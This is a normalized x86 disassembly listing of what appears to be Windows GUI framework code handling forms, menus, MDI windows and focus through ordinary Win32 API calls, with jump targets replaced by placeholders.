mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_45d0d8
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43f3dc
sub_45d10c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_460c7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_460c68
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45d158
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_460c7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_460c68
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_45d1a8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_414210
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_45d1d8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_448d84
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_460c4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_460c4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_45d1a8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_460c4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_460c38
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4143bc
call sub_403344
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_460c38
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_460c38
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_460c38
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_45d2dc
push ebx
mov ebx eax
mov eax ebx
call sub_45d2d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_423f74
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45d304
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4462dc
mov dl 0x1
mov eax esi
call sub_45d668
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_45d6e4
mov edx eax
mov eax esi
call sub_4426f0
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_446478
mov dl 0x1
mov eax esi
call sub_45c688
sub_45d384
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_448d84
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_452e18
mov edi eax
mov eax ebp
call sub_448d84
push eax
call DrawMenuBar
sub_45d400
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_419e80
xor edx edx
mov eax ebx
call sub_4547b0
sub_45d424
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45d384
mov eax edx
mov edx ebx
call sub_419e80
sub_45d44c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d612
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_460c7c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_456364
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_460c68
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_419e80
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_460c68
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
mov eax ebx
call sub_449088
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_448d84
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45d384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d619
lea eax [ ebp - 0x10 ]
call sub_404094
retn
mov dl 0x1
mov eax ebx
call sub_45e510
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_448d84
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_448d84
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_448d84
mov edx eax
mov eax esi
call sub_456364
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_448d84
push eax
call SetMenu
sub_45d634
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45d620
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_45d690
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45d684
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_45d6fc
push ebx
mov ebx eax
mov eax ebx
call sub_44839c
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_45d6e4
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45d6e4
mov edx eax
mov eax ebx
call sub_4426f0
mov edx 0xff00000f
mov eax ebx
call sub_4426f0
pop ebx
retn
sub_45d780
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_448d84
push eax
call ShowWindow
sub_45d7c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_45d1d8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_45d1d8
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_460c4c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460c38
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_45d1d8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_460c38
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_460c4c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_460c38
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_46093c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460920
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460908
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_460c38
call sub_460908
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460908
push eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460954
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_46093c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460920
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460908
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460954
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_46093c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_460c38
call sub_46093c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_46093c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460920
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460908
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460954
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460908
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460954
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_46093c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_460c38
call sub_460920
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_45db14
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_45afd0
mov edx esi
mov eax edi
call sub_4604b8
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45dbc3 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_445ba8
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_445ba8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_45dd25
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45afe0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_448d84
push eax
call SendMessageA
mov eax ebx
call sub_45e684
push eax
push 0x1
push 0x80
mov eax ebx
call sub_448d84
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_441f54
push eax
mov eax ebx
call sub_441f98
push eax
mov eax ebx
call sub_448d84
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406ccc
mov [ ebx + 0x254 ] eax
push ebx
push sub_45cc70
call sub_41ae40
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_452e18
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_448d84
push eax
call SetWindowPos
jmp r-xdata
sub_45de72
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45df9d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_445f0c
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_460390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dfa4
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_45dfac
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_446178
push 0x0
mov eax ebx
call sub_448d84
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_45dff0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4468fc
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_448d84
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_448d84
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45e054
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e0fc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e103
lea eax [ ebp - 0x4 ]
call sub_404094
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
mov eax edi
call sub_45a2f0
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403540
mov eax ebx
call sub_45e40c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403540
test al al
jne r-xdata
sub_45e10c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_445860
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_445860
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45e054
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45e154
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45e054
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45e178
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_414500
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_414438
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_414500
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_414438
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_45e3e8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_448d84
mov dx 0xb000
call sub_45a0b8
test al al
jne r-xdata
call sub_448d84
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_45a0b8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e3ef
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403b7c
jmp r-xdata
call sub_403b7c
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_445860
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_448d84
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_45a0b8
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_443750
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
call sub_403b7c
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_448d84
mov dx 0xb01a
call sub_45a0b8
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403b7c
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_443750
sub_45e40c
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_443750
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_448d84
push eax
call SetFocus
mov eax ebx
call sub_448d84
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45e45c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_443750
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
